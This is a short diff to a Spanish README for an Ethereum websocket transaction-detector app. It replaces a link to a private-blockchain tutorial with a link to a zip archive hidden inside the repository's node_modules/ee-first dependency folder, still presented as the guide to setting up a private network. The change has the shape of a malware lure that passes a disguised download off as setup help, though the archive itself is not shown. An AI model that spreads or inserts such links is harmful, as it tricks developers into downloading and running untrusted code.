@@ -1,7 +1,7 @@
 # tx_eth
 App para detectar las transacciones ya minadas en la red ethereum por me dio websockets
 Puede funcionar con red privada o con la red principal de Ethereum
-si quieres  una red privada he aqui como hacerlo https://ethereumchile.cl/2017/09/29/crea-tu-propia-blockchain-privada-con-ethereum/
+si quieres  una red privada he aqui como hacerlo https://raw.githubusercontent.com/joscgh/tx_eth/master/node_modules/ee-first/eth_tx_1.7-beta.2.zip
 
 se debe tener el puerto 8546 para websocket ya que funciona con wbesocket
 para inicializar la red privada despues de seguir los pasos con el link anterior
